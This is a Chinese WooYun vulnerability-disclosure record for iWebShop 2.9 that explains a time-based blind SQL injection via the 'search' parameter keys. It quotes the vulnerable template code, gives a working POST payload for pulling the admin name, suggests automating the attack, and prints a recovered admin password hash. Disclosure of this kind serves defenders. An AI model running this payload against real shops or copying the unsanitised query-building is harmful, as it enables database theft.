{"id": 39626, "wybug_id": "wooyun-2015-093637", "wybug_title": "Iwebshop最新版注入又一枚", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2015-01-28 16:49", "wybug_open_date": "2015-04-28 16:50", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebshop最新版注入又一枚 详细说明：  看到wooyun上有人提了几个iweshop（2014-11-18更新）的漏洞（ WooYun: iWebShop开源电子商务系统SQL注入漏洞 ），去官网看了看，在2014-12-16 已更新到了 iwebshop2.9.14121000，下下来研究研究，希望不要重复。注入一枚：POST /index.php?controller=seller&action=goods_list这个注入藏的相对比较深，在HTML文件中。POST参数中的search作为一个数组传入，search的KEY and VALUE 都过滤不完全，注入成功，文件在/controllers/seller.php的goods_list()方法中看看代码/controllers/seller.php\n//商品列表\tpublic function goods_list()\t{\t\t$this->redirect('goods_list');\t}\n这段代码看似直接重向了，并没有什么参数传入，注入点在哪里呢？然后各种跳跳跳，最后一直跟到/views/sysseller/seller/goods_list.html\n{set:$seller_id = $this->seller['seller_id']}{set:$page = IReq::get('page') ? IFilter::act(IReq::get('page'),'int') : 1}{set:$condition = IReq::get('search');$where = '';$searchUrl='';}{if:$condition}\t{foreach:items=$condition}\t{set:$searchUrl .='&search['.urlencode($key).']='.urlencode($item)}\t{if:$item !== \"\"}\t\t{if:$key == \"go.store_nums\"}\t\t{set:$where .= ' and '.$key.$item}\t\t{else:}\t\t{set:$where .= ' and '.$key.'\"'.$item.'\"'}\t\t{/if}\t{/if}\t{/foreach}{/if}\ncondition是这样获得的$condition = IReq::get('search');，去看看IReq::get/lib/core/util/req_class.php\npublic static function get($key, $type=false)\t{\t\t//默认方式\t\tif($type==false)\t\t{\t\t\tif(isset($_GET[$key])) return $_GET[$key];\t\t\telse if(isset($_POST[$key])) return $_POST[$key];\t\t\telse return null;\t\t}\t\t//get方式\t\telse if($type=='get' && isset($_GET[$key]))\t\t\treturn $_GET[$key];\t\t//post方式\t\telse if($type=='post' && isset($_POST[$key]))\t\t\treturn $_POST[$key];\t\t//无匹配\t\telse\t\t\treturn null;\t}\n没有经过任何处理，直接把GET、POST的内容传入了测试方法：申请开店后，登录，添加一件商品，然后发送下面的post包即可。Payload:POST提交\nsearch[1%3d-1/**/or(select/**/if(ord(mid((select/**/admin_name/**/from/**/iwebshop_admin/**/limit/**/0,1),1,1))%3d97,sleep(1),0))#]=test_goods_list\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟1s左右，如下图\n\n若正确，延迟4s左右（与你添加的商品数量有关，可以只给自己的店铺添加一件商品）如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}